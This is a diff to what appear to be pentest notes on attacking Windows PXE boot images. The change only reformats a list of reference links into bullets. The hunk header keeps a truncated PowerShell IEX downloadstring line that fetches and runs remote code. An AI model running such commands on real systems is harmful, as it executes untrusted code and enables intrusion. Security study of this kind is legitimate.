@@ -14,10 +14,10 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 
 Ressources :
 
-https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments
-https://www.netspi.com/blog/technical-blog/network-penetration-testing/attacks-against-windows-pxe-boot-images/
-https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
-https://connect.ed-diamond.com/MISC/misc-103/compromission-des-postes-de-travail-grace-a-laps-et-pxe
-https://www.acceis.fr/sattaquer-aux-images-pxe/
-https://github.com/wavestone-cdt/powerpxe
-https://tryhackme.com/r/room/breachingad
+- https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments
+- https://www.netspi.com/blog/technical-blog/network-penetration-testing/attacks-against-windows-pxe-boot-images/
+- https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
+- https://connect.ed-diamond.com/MISC/misc-103/compromission-des-postes-de-travail-grace-a-laps-et-pxe
+- https://www.acceis.fr/sattaquer-aux-images-pxe/
+- https://github.com/wavestone-cdt/powerpxe
+- https://tryhackme.com/r/room/breachingad
